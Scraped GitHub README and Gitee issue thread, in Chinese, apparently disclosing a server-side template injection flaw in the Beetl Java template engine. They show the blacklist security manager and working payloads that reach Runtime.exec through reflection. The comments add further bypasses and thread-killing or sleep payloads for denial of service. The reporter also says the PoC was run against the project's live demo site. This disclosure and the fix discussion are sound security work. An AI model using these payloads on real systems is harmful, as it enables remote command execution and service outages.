=== Content from github.com_fbd4b7ee_20250115_083303.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fluelueking%2FBeetl-3.15.0-vuln-poc)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fluelueking%2FBeetl-3.15.0-vuln-poc)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=luelueking%2FBeetl-3.15.0-vuln-poc)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[luelueking](/luelueking)
/
**[Beetl-3.15.0-vuln-poc](/luelueking/Beetl-3.15.0-vuln-poc)**
Public

* [Notifications](/login?return_to=%2Fluelueking%2FBeetl-3.15.0-vuln-poc) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Fluelueking%2FBeetl-3.15.0-vuln-poc)
* [Star
   7](/login?return_to=%2Fluelueking%2FBeetl-3.15.0-vuln-poc)

[7
stars](/luelueking/Beetl-3.15.0-vuln-poc/stargazers) [0
forks](/luelueking/Beetl-3.15.0-vuln-poc/forks) [Branches](/luelueking/Beetl-3.15.0-vuln-poc/branches) [Tags](/luelueking/Beetl-3.15.0-vuln-poc/tags) [Activity](/luelueking/Beetl-3.15.0-vuln-poc/activity)
 [Star](/login?return_to=%2Fluelueking%2FBeetl-3.15.0-vuln-poc)

 [Notifications](/login?return_to=%2Fluelueking%2FBeetl-3.15.0-vuln-poc) You must be signed in to change notification settings

* [Code](/luelueking/Beetl-3.15.0-vuln-poc)
* [Issues
  0](/luelueking/Beetl-3.15.0-vuln-poc/issues)
* [Pull requests
  0](/luelueking/Beetl-3.15.0-vuln-poc/pulls)
* [Actions](/luelueking/Beetl-3.15.0-vuln-poc/actions)
* [Projects
  0](/luelueking/Beetl-3.15.0-vuln-poc/projects)
* [Security](/luelueking/Beetl-3.15.0-vuln-poc/security)
* [Insights](/luelueking/Beetl-3.15.0-vuln-poc/pulse)

Additional navigation options

* [Code](/luelueking/Beetl-3.15.0-vuln-poc)
* [Issues](/luelueking/Beetl-3.15.0-vuln-poc/issues)
* [Pull requests](/luelueking/Beetl-3.15.0-vuln-poc/pulls)
* [Actions](/luelueking/Beetl-3.15.0-vuln-poc/actions)
* [Projects](/luelueking/Beetl-3.15.0-vuln-poc/projects)
* [Security](/luelueking/Beetl-3.15.0-vuln-poc/security)
* [Insights](/luelueking/Beetl-3.15.0-vuln-poc/pulse)

# luelueking/Beetl-3.15.0-vuln-poc

    main[Branches](/luelueking/Beetl-3.15.0-vuln-poc/branches)[Tags](/luelueking/Beetl-3.15.0-vuln-poc/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[4 Commits](/luelueking/Beetl-3.15.0-vuln-poc/commits/main/) | | |
| [README.md](/luelueking/Beetl-3.15.0-vuln-poc/blob/main/README.md "README.md") | | [README.md](/luelueking/Beetl-3.15.0-vuln-poc/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# Beetl-3.15.0-vuln-poc

### Beetl直到最新版本都存在SSTI(模版注入)漏洞

* 对于安全管理器的策略采用的是黑名单的机制

```
public class DefaultNativeSecurityManager implements NativeSecurityManager{

        @Override
        public boolean permit(String resourceId, Class c, Object target, String method){
                if (c.isArray()){
                        //允许调用，但实际上会在在其后调用中报错。不归此处管理
                        return true;
                }
                String name = c.getSimpleName();
                String pkg = c.getPackage().getName();
                if (pkg.startsWith("java.lang")){
                        if (name.equals("Runtime") || name.equals("Process") || name.equals("ProcessBuilder")
                                        || name.equals("System")){
                                return false;
                        }
                }
                return true;
        }
}
```

* 如果使用反射(java reflect)即可以绕过黑名单的一切策略
* poc

```
${@Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("s='open -a Calculator';java.lang.Runtime.getRuntime().exec(s);")}
```

[![ilOcbN.png](https://camo.githubusercontent.com/8c02969fcae816a3f900216dc971bf2a1ca4d2f7e942750d347eb2e98e6cf238/68747470733a2f2f692e3332383838382e78797a2f323032332f30332f33312f696c4f63624e2e706e67)](https://camo.githubusercontent.com/8c02969fcae816a3f900216dc971bf2a1ca4d2f7e942750d347eb2e98e6cf238/68747470733a2f2f692e3332383838382e78797a2f323032332f30332f33312f696c4f63624e2e706e67)

* 拿官方的网站做例子 我输入了以下payload仅用于测试

[![ilbloa.png](https://camo.githubusercontent.com/482eaade70b1fd84743314aa758ec8793c83d370dc6b8e955afdf4ce4040eeca/68747470733a2f2f692e3332383838382e78797a2f323032332f30332f33312f696c626c6f612e706e67)](https://imgloc.com/i/ilbloa)

* 并成功拿到服务器的控制权限

[![ilbpyZ.png](https://camo.githubusercontent.com/995c7cfa40b64991ee7136ebf80165c3079c2f51c283a01d79268765fd69be68/68747470733a2f2f692e3332383838382e78797a2f323032332f30332f33312f696c6270795a2e706e67)](https://camo.githubusercontent.com/995c7cfa40b64991ee7136ebf80165c3079c2f51c283a01d79268765fd69be68/68747470733a2f2f692e3332383838382e78797a2f323032332f30332f33312f696c6270795a2e706e67)

### 修复建议

* 限制反射(java reflect)

### 报告人

@luelueking

## About

No description, website, or topics provided.
### Resources

[Readme](#readme-ov-file)

[Activity](/luelueking/Beetl-3.15.0-vuln-poc/activity)
### Stars

[**7**
stars](/luelueking/Beetl-3.15.0-vuln-poc/stargazers)
### Watchers

[**1**
watching](/luelueking/Beetl-3.15.0-vuln-poc/watchers)
### Forks

[**0**
forks](/luelueking/Beetl-3.15.0-vuln-poc/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fluelueking%2FBeetl-3.15.0-vuln-poc&report=luelueking+%28user%29)

## [Releases](/luelueking/Beetl-3.15.0-vuln-poc/releases)

No releases published

## [Packages 0](/users/luelueking/packages?repo_name=Beetl-3.15.0-vuln-poc)

No packages published

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from gitee.com_5ed00429_20250115_083301.html ===


[Sign in](/login)
[Sign up](/signup)

* [Explore](/explore)
* [Enterprise](/enterprises)
* [Education](/education)
* [Search](/search)
* [Help](/help)
* [Terms of use](/terms)
* [About Us](/about_us)

[![Gitee — A Git-based Code Hosting and Research Collaboration Platform](/static/images/logo.svg?t=158106664 "Gitee — A Git-based Code Hosting and Research Collaboration Platform")
![Gitee — A Git-based Code Hosting and Research Collaboration Platform](/static/images/logo-black.svg?t=158106664 "Gitee — A Git-based Code Hosting and Research Collaboration Platform")](https://gitee.com)
[Explore](/explore "Explore")[Enterprise](/enterprises "Enterprise")[Education](/education "Education")[Gitee Premium](https://gitee.cn?utm_source=giteecom "Gitee Premium")[Gitee AI](https://ai.gitee.com/?utm_sources=site_nav "Gitee AI")
[![Gitee — A Git-based Code Hosting and Research Collaboration Platform](/static/images/logo.svg?t=158106664 "Gitee — A Git-based Code Hosting and Research Collaboration Platform")
![Gitee — A Git-based Code Hosting and Research Collaboration Platform](/static/images/logo-black.svg?t=158106664 "Gitee — A Git-based Code Hosting and Research Collaboration Platform")](https://gitee.com)

![功能更新](https://cn-assets.gitee.com/assets/bulb_off-24ee940be20998aace89a3f040cbc704.svg)
![]()

I know
View Details

[Sign in](/login)[Sign up](/signup)

Fetch the repository succeeded.

[Open Source](/explore)
>
[Development Lib](/explore/program-develop)
>
[Template Engine](/explore/template-engine)
&&

Donate
Please sign in before you donate.

Cancel
[Sign in](/login)

Scan WeChat QR to Pay

![]()

Cancel
Complete

Prompt
Switch to Alipay.

OK
Cancel

Watch

[Unwatch](/xiandafu/beetl/unwatch)[Watching](/xiandafu/beetl/watch)[Releases Only](/xiandafu/beetl/release_only_watch)[Ignoring](/xiandafu/beetl/ignoring_watch)

[101](/xiandafu/beetl/watchers "101")
[Star](/login)[607](/xiandafu/beetl/stargazers "607")
[Fork](/login "You must be signed in to fork a repository")[132](/xiandafu/beetl/members "132")
## [闲.大赋(李家智)](/xiandafu "闲.大赋(李家智)")/[Beetl](/xiandafu/beetl "Beetl")

[Code](/xiandafu/beetl)[Issues
88](/xiandafu/beetl/issues)[Pull Requests
1](/xiandafu/beetl/pulls)[Wiki](/xiandafu/beetl/wikis)[Insights](/xiandafu/beetl/graph/master)[Pipelines](/xiandafu/beetl/gitee_go)

Service

[![Logo en](/static/images/logo-en.svg)](/xiandafu/beetl/pages)[![Maven](https://cn-assets.gitee.com/assets/maven-bd58aee84f266d64d4b8ce5b006a9fcf.png)](/xiandafu/beetl/javadoc)[![Sonar mini](https://cn-assets.gitee.com/assets/sonar_mini-5e1b54bb9f6c951d97fb778ef623afea.png)
Quality Analysis](/xiandafu/beetl/quality_analyses?platform=sonar_qube)[![Jenkins for gitee](https://cn-assets.gitee.com/assets/jenkins_for_gitee-554ec65c490d0f1f18de632c48acc4e7.png)
Jenkins for Gitee](https://gitee.com/help/articles/4193)[![Cloudbase](https://cn-assets.gitee.com/assets/cloudbase-1197b95ea3398aff1df7fe17c65a6d42.png?20200925)
Tencent CloudBase](https://gitee.com/help/articles/4318)[![Cloud serverless](https://cn-assets.gitee.com/assets/cloud_serverless-686cf926ced5d6d2f1d6e606d270b81e.png)
Tencent Cloud Serverless](https://gitee.com/help/articles/4330)[![Logo](https://cn-assets.gitee.com/assets/open_sca/logo-9049ced662b2f9936b8001e6f9cc4952.png)
悬镜安全](/xiandafu/beetl/open_sca)[![Sae](https://cn-assets.gitee.com/assets/SAE-f3aa9366a1e2b7fff4747402eb8f10c3.png)
Aliyun SAE](https://help.gitee.com/devops/connect/Aliyun-SAE)[![Codeblitz](https://cn-assets.gitee.com/assets/Codeblitz-8824e38875a106e16e29ff57ec977b08.png)
Codeblitz](https://codeblitz.cloud.alipay.com/gitee/xiandafu/beetl/tree/master)
Don’t show this again

Update failed. Please try again later!

[Issues](/xiandafu/beetl/issues)

 /
详情

Remove this flag
#### Content Risk Flag

This task is identified by  as the content contains sensitive information such as code security bugs, privacy leaks, etc., so it is only accessible to contributors of this repository.

## Beetl 存在 SSTI 漏洞[BUG]

Done

#I6RUIP

[陈再](/luelueking)
Opened this issue
2023-03-31 10:21

对比其他模板引擎，Beetl的安全策略需要加强
# Beetl-3.15.0-vuln-poc
### Beetl直到最新版本都存在SSTI(模版注入)漏洞
- 对于安全管理器的策略采用的是黑名单的机制
```java
public class DefaultNativeSecurityManager implements NativeSecurityManager{
@Override
public boolean permit(String resourceId, Class c, Object target, String method){
if (c.isArray()){
//允许调用，但实际上会在在其后调用中报错。不归此处管理
return true;
}
String name = c.getSimpleName();
String pkg = c.getPackage().getName();
if (pkg.startsWith("java.lang")){
if (name.equals("Runtime") || name.equals("Process") || name.equals("ProcessBuilder")
|| name.equals("System")){
return false;
}
}
return true;
}
}
```
- 如果使用反射(java reflect)即可以绕过黑名单的一切策略
- poc
```java
${@Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("s='open -a Calculator';java.lang.Runtime.getRuntime().exec(s);")}
```
<img src="https://i.328888.xyz/2023/03/31/ilOcbN.png" alt="ilOcbN.png" border="0" />
- 拿官方的网站做例子 我输入了以下payload仅用于测试
<a href="https://imgloc.com/i/ilbloa"><img src="https://i.328888.xyz/2023/03/31/ilbloa.png" alt="ilbloa.png" border="0" /></a>
- 并成功拿到服务器的控制权限
<img src="https://i.328888.xyz/2023/03/31/ilbpyZ.png" alt="ilbpyZ.png" border="0" />
### 修复建议
- 限制反射(java reflect)
### 报告人
@luelueking
### 参考
- https://github.com/luelueking/Beetl-3.15.0-vuln-poc

对比其他模板引擎，Beetl的安全策略需要加强
# Beetl-3.15.0-vuln-poc
### Beetl直到最新版本都存在SSTI(模版注入)漏洞
- 对于安全管理器的策略采用的是黑名单的机制
```java
public class DefaultNativeSecurityManager implements NativeSecurityManager{
@Override
public boolean permit(String resourceId, Class c, Object target, String method){
if (c.isArray()){
//允许调用，但实际上会在在其后调用中报错。不归此处管理
return true;
}
String name = c.getSimpleName();
String pkg = c.getPackage().getName();
if (pkg.startsWith("java.lang")){
if (name.equals("Runtime") || name.equals("Process") || name.equals("ProcessBuilder")
|| name.equals("System")){
return false;
}
}
return true;
}
}
```
- 如果使用反射(java reflect)即可以绕过黑名单的一切策略
- poc
```java
${@Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("s='open -a Calculator';java.lang.Runtime.getRuntime().exec(s);")}
```
<img src="https://i.328888.xyz/2023/03/31/ilOcbN.png" alt="ilOcbN.png" border="0" />
- 拿官方的网站做例子 我输入了以下payload仅用于测试
<a href="https://imgloc.com/i/ilbloa"><img src="https://i.328888.xyz/2023/03/31/ilbloa.png" alt="ilbloa.png" border="0" /></a>
- 并成功拿到服务器的控制权限
<img src="https://i.328888.xyz/2023/03/31/ilbpyZ.png" alt="ilbpyZ.png" border="0" />
### 修复建议
- 限制反射(java reflect)
### 报告人
@luelueking
### 参考
- https://github.com/luelueking/Beetl-3.15.0-vuln-poc

### Comments (6)

[![]()](/luelueking "luelueking")
[陈再](/luelueking "luelueking") created**任务**

[![]()](/luelueking "luelueking")
[陈再](/luelueking "luelueking") changed **description**

Original content
对比其他模板引擎，Beetl的安全策略需要加强

New content
对比其他模板引擎，Beetl的安全策略需要加强

# Beetl-3.15.0-vuln-poc

### Beetl直到最新版本都存在SSTI(模版注入)漏洞

- 对于安全管理器的策略采用的是黑名单的机制

```java

public class DefaultNativeSecurityManager implements NativeSecurityManager{

 @Override

 public boolean permit(String resourceId, Class c, Object target, String method){

 if (c.isArray()){

 //允许调用，但实际上会在在其后调用中报错。不归此处管理

 return true;

 }

 String name = c.getSimpleName();

 String pkg = c.getPackage().getName();

 if (pkg.startsWith("java.lang")){

 if (name.equals("Runtime") || name.equals("Process") || name.equals("ProcessBuilder")

 || name.equals("System")){

 return false;

 }

 }

 return true;

 }

}

```

- 如果使用反射(java reflect)即可以绕过黑名单的一切策略

- poc

```java

${@Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("s='open -a Calculator';java.lang.Runtime.getRuntime().exec(s);")}

```

<img src="https://i.328888.xyz/2023/03/31/ilOcbN.png" alt="ilOcbN.png" border="0" />

- 拿官方的网站做例子 我输入了以下payload仅用于测试

<a href="https://imgloc.com/i/ilbloa"><img src="https://i.328888.xyz/2023/03/31/ilbloa.png" alt="ilbloa.png" border="0" /></a>

- 并成功拿到服务器的控制权限

<img src="https://i.328888.xyz/2023/03/31/ilbpyZ.png" alt="ilbpyZ.png" border="0" />

### 修复建议

- 限制反射(java reflect)

### 报告人

 @luelueking

### 参考

- https://github.com/luelueking/Beetl-3.15.0-vuln-poc

Expand operation logs

Collapse operation logs

[![]()
lsw](/lsw001)

*复制链接地址*

同问这个问题，很早就这个问题，一直到现在好像没有修复，以前好多用beetl都貌似都有这个问题

误判申诉

此处可能存在不合适展示的内容，页面不予展示。您可通过相关编辑功能自查并修改。

如您确认内容无涉及 不当用语 / 纯广告导流 / 暴力 / 低俗色情 / 侵权 / 盗版 / 虚假 / 无价值内容或违法国家有关法律法规的内容，可点击提交进行申诉，我们将尽快为您处理。

取消
提交

[![29 xiandafu 1678706040](https://foruda.gitee.com/avatar/1678706040476760566/29_xiandafu_1678706040.png!avatar60)
闲.大赋(李家智)](/xiandafu)owner

*复制链接地址*

@luelueking 多谢，我增加了禁用Class，调用
```
if (pkgName.startsWith("java.lang")) {
return !className.equals("Runtime")
&& !className.equals("Process")
&& !className.equals("ProcessBuilder")
&& !className.equals("Class")
&& !className.equals("System");
}
```
@lsw001 beetl可以设置禁用本地java调用，可以避免这个问题，也可以自定义安全管理器来避免，比如像我这样，增加对class的限制。 而且如果应用不像beetl在线体验网站对外暴露，应该是没有这个问题的。 他不像JSON安全漏洞那样具备普偏性。 你说好多用beetl的，能举几个例子么？

[![878040 chinavicrack 1578934647](https://foruda.gitee.com/avatar/1676933696615669164/878040_chinavicrack_1578934647.png!avatar60)
Sasser](/chinavicrack)
Reply
[闲.大赋(李家智)](/xiandafu)
owner

*复制链接地址*

允许本地java调用本来就是一个正常的设计功能
可以考虑不认定是安全漏洞，直接放开交给用户控制，当启用了本地java调用，那么调用外部命令获取数据就是一个正常需求设计
这块其实防护现在还是比较松散的，容易绕过
拿上面禁用Class来说，稍微改改又能刷一个洞出来了
```
${@sun.reflect.misc.ReflectUtil.newInstance(@sun.reflect.misc.ReflectUtil.forName("javax.script.ScriptEngineManager")).getEngineByName("js").eval("s='ls';java.lang.Runtime.getRuntime().exec(s);")}
```
![输入图片说明](https://foruda.gitee.com/images/1686935635437516323/19835dd6\_878040.png "屏幕截图")
而且除了命令执行，还有文件读写，删除文件、请求http等等操作也有潜在的“漏洞风险”

[![29 xiandafu 1678706040](https://foruda.gitee.com/avatar/1678706040476760566/29_xiandafu_1678706040.png!avatar60)
闲.大赋(李家智)](/xiandafu)owner
Reply
[Sasser](/chinavicrack)

*复制链接地址*

防不胜防，多谢 @chinavicrack ，我再调整一下，禁用sun包，还有什么需要禁用的？
java.io,java.net 等 ？

[![878040 chinavicrack 1578934647](https://foruda.gitee.com/avatar/1676933696615669164/878040_chinavicrack_1578934647.png!avatar60)
Sasser](/chinavicrack)

*复制链接地址*

@xiandafu
比如我直接用beetl自带的方法，创建对象
${@org.beetl.core.fun.ObjectUtil.instance("javax.script.ScriptEngineManager",@org.beetl.core.fun.ObjectUtil.getClassLoader()).getEngineByName("js").eval("s='ls';java.lang.Runtime.getRuntime().exec(s);")}
还有比如我直接将BeetlKit的全局安全管理器去掉，然后就简单了
${@org.beetl.core.BeetlKit.gt.setNativeSecurity(null)} ${@org.beetl.core.BeetlKit.execute("@java.lang.Runtime.getRuntime().exec(\"calc\");")}
还有比如java.lang.Thread
如果输入的是${@java.lang.Thread.sleep(999999999)}，那不就能导致一直卡住拒绝服务了
或者${@java.lang.Thread.currentThread().stop()} 不就能让线程直接中断，甚至${@java.lang.Thread.currentThread().getThreadGroup().stop()} 还可能把系统所有线程杀死
如果考虑上第三方库的话，那就多了，我一个人也不可能全列出来
黑名单只能起到相对的安全，有一定缓解作用

[![29 xiandafu 1678706040](https://foruda.gitee.com/avatar/1678706040476760566/29_xiandafu_1678706040.png!avatar60)
闲.大赋(李家智)](/xiandafu)owner
Reply
[Sasser](/chinavicrack)

*复制链接地址*

好的，多谢。我在更改一下黑名单，然后添加个白名单用作为在线引擎和作为默认安全管理器

[![29 xiandafu 1678706040](https://foruda.gitee.com/avatar/1678706040476760566/29_xiandafu_1678706040.png!avatar100)](/xiandafu "xiandafu")
[闲.大赋(李家智)](/xiandafu "xiandafu") changed **issue state** from **待办的** to **已完成**

[Sign in](/login)
to comment

Status

Done

Backlog

Doing

Done

Closed

Assignees

Not set

Labels

Not set

[Label settings](/xiandafu/beetl/labels)

Milestones
No related milestones

No related milestones

Pull Requests
None yet

None yet

Successfully merging a pull request will close this issue.

Branches
No related branch

Branches (11)

Tags (5)

master
debug-test
master-ignoreequal
beetl-online
xml-tag
jdk17-springboot3
beetl-antlr4
antlr-4.5
BeetlCore/3.9.3/Impl
beetl3.1
M2

3.16.1
3.15.14
3.15.13.RELEASE
3.15.10.RELEASE
3.15.8.RELEASE

Planed to start   -   Planed to end

-

Top level

Not Top

Top Level: High

Top Level: Medium

Top Level: Low

Priority

Not specified

Serious

Main

Secondary

Unimportant

参与者（4）
[![]()](/lsw001)
[![29 xiandafu 1678706040](https://foruda.gitee.com/avatar/1678706040476760566/29_xiandafu_1678706040.png!avatar30)](/xiandafu)
[![878040 chinavicrack 1578934647](https://foruda.gitee.com/avatar/1676933696615669164/878040_chinavicrack_1578934647.png!avatar30)](/chinavicrack)
[![]()](/luelueking)

Java
1
https://gitee.com/xiandafu/beetl.git
git@gitee.com:xiandafu/beetl.git
xiandafu
beetl
Beetl

[![Gitee — A Git-based Code Hosting and Research Collaboration Platform](/static/images/logo-black.svg?t=158106666)](https://gitee.com)
©OSCHINA. All rights reserved

[Git Resources](/all-about-git)

[Learning Git](https://help.gitee.com/learn-Git-Branching/)

[CopyCat](https://copycat.gitee.com/)

[Downloads](/appclient)

[Gitee Reward](/gitee_reward)

[Gitee Stars](/gitee-stars)

[Featured Projects](/gvp)

[Blog](https://blog.gitee.com/)

[Nonprofit](/enterprises#nonprofit-plan)

[Gitee Go](https://gitee.com/features/gitee-go)

[OpenAPI](/api/v5/swagger)

[Help Center](https://help.gitee.com)

[Self-services](/self_services)

[Updates](/help/articles/4378)

[About Us](/about_us)

[Join us](https://www.oschina.net/news/131099/oschina-hiring)

[Terms of use](/terms)

[Feedback](/oschina/git-osc/issues)

[Partners](/links.html)

![Exchange](https://cn-assets.gitee.com/assets/contact_qr-5e2c2a8da453396590e56a545bce4974.jpg)

Exchange

![微信服务号](https://cn-assets.gitee.com/assets/qrcode-weixin@2x-b74cc97a2ea80123ea53a737f709836d.png)

WeChat

client#oschina.cn
Enterprise:400-606-0201

Pro：
13670252304

13352947997

![开放原子开源基金会](https://cn-assets.gitee.com/assets/logo-openatom-d083391cc8a54e283529f3fc11cc38ca.svg)
[OpenAtom Foundation](https://www.openatom.org/)
Cooperative code hosting platform

![违法和不良信息举报中心](https://cn-assets.gitee.com/assets/12377@2x-1aa42ed2d2256f82a61ecf57be1ec244.png)
[违法和不良信息举报中心](https://12377.cn)

[粤ICP备12009483号](http://beian.miit.gov.cn/)

[简 体](/language/zh-CN)
/
[繁 體](/language/zh-TW)
/
[English](/language/en)

Going to Help Center
### Search

[Git 命令在线学习](https://oschina.gitee.io/learn-git-branching/?utm_source==gitee-help-widget "Git 命令在线学习")[如何在 Gitee 导入 GitHub 仓库](https://gitee.com/help/articles/4261?utm_source==gitee-help-widget "如何在 Gitee 导入 GitHub 仓库")
[Git 仓库基础操作](/help/articles/4114)

[企业版和社区版功能对比](/help/articles/4166)

[SSH 公钥设置](/help/articles/4191)

[如何处理代码冲突](/help/articles/4194)

[仓库体积过大，如何减小？](/help/articles/4232)

[如何找回被删除的仓库数据](/help/articles/4279)

[Gitee 产品配额说明](/help/articles/4283)

[GitHub仓库快速导入Gitee及同步更新](/help/articles/4284)

[什么是 Release（发行版）](/help/articles/4328)

[将 PHP 项目自动发布到 packagist.org](/help/articles/4354)

Comment

Repository Report

Back to the top

Login prompt

This operation requires login to the code cloud account. Please log in before operating.

Go to login

No account. Register


